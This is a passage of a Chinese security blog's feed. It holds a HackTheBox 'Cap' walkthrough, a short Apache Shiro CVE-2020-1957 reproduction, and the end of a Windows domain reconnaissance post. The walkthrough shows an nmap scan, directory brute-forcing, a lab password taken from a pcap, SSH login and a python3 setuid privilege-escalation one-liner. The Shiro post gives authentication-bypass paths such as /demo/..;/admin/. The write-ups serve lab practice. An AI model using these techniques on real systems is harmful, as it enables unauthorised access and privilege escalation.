class="headerlink" title="0x09.BloodHound域内分析工具"></a>0x09.BloodHound域内分析工具</h2><p><code>首先进行信息采集，然后导入分析即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-工作组信息收集&quot;&gt;&lt;a href=&quot;#0x01-工作组信息收集&quot; class=&quot;headerlink&quot; title=&quot;0x01.工作组信息收集&quot;&gt;&lt;/a&gt;0x01.工作组信息收集&lt;/h2&gt;&lt;h3 id=&quot;01-检测当前shell权限&quot;&gt;&lt;a href=&quot;#01-检测当前shell权限&quot; class=&quot;headerlink&quot; title=&quot;01.检测当前shell权限&quot;&gt;&lt;/a&gt;01.检测当前shell权限&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;whoami /user    #查看当前用户的SID&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;whoami /priv    #查看当前用户的安全权限&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;whoami /all&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;02-查看当前系统信息&quot;&gt;&lt;a href=&quot;#02-查看当前系统信息&quot; class=&quot;headerlink&quot; title=&quot;02.查看当前系统信息&quot;&gt;&lt;/a&gt;02.查看当前系统信息&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;systeminfo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;03-tcp-udp-网络连接状态&quot;&gt;&lt;a href=&quot;#03-tcp-udp-网络连接状态&quot; class=&quot;headerlink&quot; title=&quot;03.tcp/udp 网络连接状态&quot;&gt;&lt;/a&gt;03.tcp/udp 网络连接状态&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;netstat -nao&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="内网渗透测试" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="内网安全" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[cap]</title>
    <link href="https://lunamoore.github.io/2021/07/14/HTB-cap/"/>
    <id>https://lunamoore.github.io/2021/07/14/HTB-cap/</id>
    <published>2021-07-14T06:23:37.000Z</published>
    <updated>2021-07-14T06:30:37.958Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2021/07/14/HTB-cap/image-20210714122750156.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>可以看到开放了21、21、80端口</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/cap]</span><br><span class="line">└─# ftp anonymous@10.10.10.245                                                                                                                             1 ⚙</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 00:34 EDT</span><br><span class="line">Nmap scan report for 10.10.10.245</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORT     STATE    SERVICE        VERSION</span><br><span class="line">21/tcp   open     ftp            vsftpd 3.0.3</span><br><span class="line">22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)</span><br><span class="line">|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)</span><br><span class="line">|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)</span><br><span class="line">80/tcp   open     http           gunicorn</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 193</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;title&gt;Bad Request&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;</span><br><span class="line">|     Invalid Request Line &amp;#x27;Invalid HTTP request line: &amp;#x27;&amp;#x27;&amp;#x27;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Server: gunicorn</span><br><span class="line">|     Date: Wed, 14 Jul 2021 04:39:13 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 19386</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Security Dashboard&lt;/title&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&gt;</span><br><span class="line">|     &lt;!-- amchar</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Server: gunicorn</span><br><span class="line">|     Date: Wed, 14 Jul 2021 04:39:14 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Allow: GET, HEAD, OPTIONS</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 196</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;title&gt;Bad Request&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;</span><br><span class="line">|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">|_http-server-header: gunicorn</span><br><span class="line">|_http-title: Security Dashboard</span><br><span class="line">1117/tcp filtered ardus-mtrns</span><br><span class="line">3371/tcp filtered satvid-datalnk</span><br><span class="line">5822/tcp filtered unknown</span><br><span class="line">5952/tcp filtered unknown</span><br><span class="line">8652/tcp filtered unknown</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port80-TCP:V=7.91%I=7%D=7/14%Time=60EE6988%P=x86_64-pc-linux-gnu%r(GetR</span><br><span class="line">SF:equest,1059,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20</span><br><span class="line">SF:Wed,\x2014\x20Jul\x202021\x2004:39:13\x20GMT\r\nConnection:\x20close\r\</span><br><span class="line">SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193</span><br><span class="line">SF:86\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;en\&quot;&gt;\</span><br><span class="line">SF:n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\</span><br><span class="line">SF:x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\</span><br><span class="line">SF:x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=</span><br><span class="line">SF:1\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;shortcut\x20icon\&quot;\x20type=\&quot;image</span><br><span class="line">SF:/png\&quot;\x20href=\&quot;/static/images/icon/favicon\.ico\&quot;&gt;\n\x20\x20\x20\x20&lt;</span><br><span class="line">SF:link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/bootstrap\.min\.css\&quot;&gt;</span><br><span class="line">SF:\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/fon</span><br><span class="line">SF:t-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20</span><br><span class="line">SF:href=\&quot;/static/css/themify-icons\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=</span><br><span class="line">SF:\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/metisMenu\.css\&quot;&gt;\n\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/owl\.carousel\.min\.</span><br><span class="line">SF:css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/c</span><br><span class="line">SF:ss/slicknav\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&quot;)%r(HTTPOption</span><br><span class="line">SF:s,B3,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Wed,\x2</span><br><span class="line">SF:014\x20Jul\x202021\x2004:39:14\x20GMT\r\nConnection:\x20close\r\nConten</span><br><span class="line">SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OP</span><br><span class="line">SF:TIONS\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\.1\x2</span><br><span class="line">SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text</span><br><span class="line">SF:/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20</span><br><span class="line">SF:\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invali</span><br><span class="line">SF:d\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTSP</span><br><span class="line">SF:/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(GenericLines,11E,&quot;HTT</span><br><span class="line">SF:P/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type</span><br><span class="line">SF::\x20text/html\r\nContent-Length:\x20193\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x</span><br><span class="line">SF:20&lt;body&gt;\n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\</span><br><span class="line">SF:x20Invalid\x20Request\x20Line\x20&amp;#x27;Invalid\x20HTTP\x20request\x20li</span><br><span class="line">SF:ne:\x20&amp;#x27;&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;);</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 221.16 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-FTP匿名访问"><a href="#0x02-FTP匿名访问" class="headerlink" title="0x02.FTP匿名访问"></a>0x02.FTP匿名访问</h2><p><code>由于开放了21端口，所以尝试匿名登入，可以看到不允许匿名登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/cap]</span><br><span class="line">└─# ftp anonymous@10.10.10.245                                                                                                                             1 ⚙</span><br><span class="line">ftp: anonymous@10.10.10.245: Name or service not known</span><br><span class="line"><span class="meta">ftp&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-访问80端口"><a href="#0x03-访问80端口" class="headerlink" title="0x03.访问80端口"></a>0x03.访问80端口</h2><p><code>手动爬虫发现这是一个网络设备管理面板</code></p><img src="/2021/07/14/HTB-cap/image-20210714131548126.png" class><p><code>多次点击发现url也会发生变化，且可以下载数据包</code></p><img src="/2021/07/14/HTB-cap/image-20210714131753971.png" class><img src="/2021/07/14/HTB-cap/image-20210714131753971.png" class><p><code>扫描data目录，访问发现一共有6个有效链接，分别是0、1、2、3、4、5，全部下载</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">──(root💀kali)-[~/htb/cap]</span><br><span class="line">└─# dirb http://10.10.10.245/data/                                                                                                                         1 ⚙</span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">START_TIME: Wed Jul 14 01:10:25 2021</span><br><span class="line">URL_BASE: http://10.10.10.245/data/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line">---- Scanning URL: http://10.10.10.245/data/ ----</span><br><span class="line">+ http://10.10.10.245/data/0 (CODE:200|SIZE:17147)</span><br><span class="line">+ http://10.10.10.245/data/00 (CODE:200|SIZE:17147) </span><br><span class="line">+ http://10.10.10.245/data/01 (CODE:200|SIZE:17144) </span><br><span class="line">+ http://10.10.10.245/data/02 (CODE:200|SIZE:17144)</span><br><span class="line">+ http://10.10.10.245/data/03 (CODE:200|SIZE:17144)                                                   </span><br><span class="line">+ http://10.10.10.245/data/04 (CODE:200|SIZE:17144)                                                     </span><br><span class="line">+ http://10.10.10.245/data/05 (CODE:200|SIZE:17147)                                                   </span><br><span class="line">+ http://10.10.10.245/data/1 (CODE:200|SIZE:17144)                                                      </span><br><span class="line">+ http://10.10.10.245/data/2 (CODE:200|SIZE:17144)                                                       </span><br><span class="line">+ http://10.10.10.245/data/3 (CODE:200|SIZE:17144)                                                       </span><br><span class="line">+ http://10.10.10.245/data/4 (CODE:200|SIZE:17144)                                                       + http://10.10.10.245/data/5 (CODE:200|SIZE:17147)</span><br></pre></td></tr></table></figure><img src="/2021/07/14/HTB-cap/image-20210714132457089.png" class><h2 id="0x04-数据包分析"><a href="#0x04-数据包分析" class="headerlink" title="0x04.数据包分析"></a>0x04.数据包分析</h2><p><code>6个数据包中只有0.pcap包含有用信息，得到用户与密码</code></p><blockquote><p>user:nathan</p><p>pass:Buck3tH4TF0RM3!</p></blockquote><img src="/2021/07/14/HTB-cap/image-20210714140327176.png" class><p><code>登入得到flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ssh nathan@10.10.10.245                                                                                                                                1 ⚙</span><br><span class="line">nathan@10.10.10.245&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Wed Jul 14 06:11:21 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:           0.04</span><br><span class="line">  Usage of /:            35.0% of 8.73GB</span><br><span class="line">  Memory usage:          21%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             228</span><br><span class="line">  Users logged in:       0</span><br><span class="line">  IPv4 address for eth0: 10.10.10.245</span><br><span class="line">  IPv6 address for eth0: dead:beef::250:56ff:feb9:dda9</span><br><span class="line"></span><br><span class="line">  =&gt; There are 4 zombie processes.</span><br><span class="line"></span><br><span class="line"> * Super-optimized for small spaces - read how we shrank the memory</span><br><span class="line">   footprint of MicroK8s to make it the smallest full K8s around.</span><br><span class="line"></span><br><span class="line">   https://ubuntu.com/blog/microk8s-memory-optimisation</span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check for new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">nathan@cap:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">nathan@cap:~$ cat user.txt </span><br><span class="line">*************************</span><br><span class="line">nathan@cap:~$</span><br></pre></td></tr></table></figure><h2 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05.提权"></a>0x05.提权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nathan@cap:~$ python3 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash"> /bin/bash</span></span><br><span class="line">root@cap:~# cd /root</span><br><span class="line">root@cap:/root# ls</span><br><span class="line">root.txt  snap</span><br><span class="line">root@cap:/root# cat root.txt </span><br><span class="line">****************************</span><br><span class="line">root@cap:/root# </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;img src=&quot;/2021/07/14/HTB-cap/image-20210714122750156.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1957</title>
    <link href="https://lunamoore.github.io/2021/06/06/CVE-2020-1957/"/>
    <id>https://lunamoore.github.io/2021/06/06/CVE-2020-1957/</id>
    <published>2021-06-06T13:20:02.000Z</published>
    <updated>2021-06-06T13:39:25.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞"><a href="#（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞" class="headerlink" title="（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞"></a>（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞</h2><hr><h2 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01.漏洞简述"></a>0x01.漏洞简述</h2><p>Apache Shiro 1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。</p><a id="more"></a><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02.影响版本"></a>0x02.影响版本</h2><p>Apache Shiro &lt; v1.5.2</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03.漏洞分析"></a>0x03.漏洞分析</h2><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5L2FydGljbGUvZGV0YWlscy8xMDcwMzE3NDY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjIyOTg1OTkzMTY3ODAyNTUyNzgxNDclMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmJsb2cuJTI1MjIlMjU3RCZyZXF1ZXN0X2lkPTE2MjI5ODU5OTMxNjc4MDI1NTI3ODE0NyZiaXpfaWQ9MCZ1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmJsb2d+Zmlyc3RfcmFua192Mn5yYW5rX3YyOS0zLTEwNzAzMTc0Ni5ub25lY2FzZSZ1dG1fdGVybT1DVkUtMjAyMC0xOTU3JnNwbT0xMDE4LjIyMjYuMzAwMS40NDUw">轮子轮子<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03.漏洞复现"></a>0x03.漏洞复现</h2><p><strong>环境搭建</strong></p><p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLw==">vulhub<i class="fa fa-external-link-alt"></i></span></p><p>admin认证绕过</p><p>直接访问/admin，跳转到登入页面</p><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_08.png" class><p>绕过：/demo/..;/admin/  或   /demo;/../admin/</p><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_09.png" class><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_10.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞&quot;&gt;&lt;a href=&quot;#（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞&quot; class=&quot;headerlink&quot; title=&quot;（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞&quot;&gt;&lt;/a&gt;（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x01-漏洞简述&quot;&gt;&lt;a href=&quot;#0x01-漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;0x01.漏洞简述&quot;&gt;&lt;/a&gt;0x01.漏洞简述&lt;/h2&gt;&lt;p&gt;Apache Shiro 1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
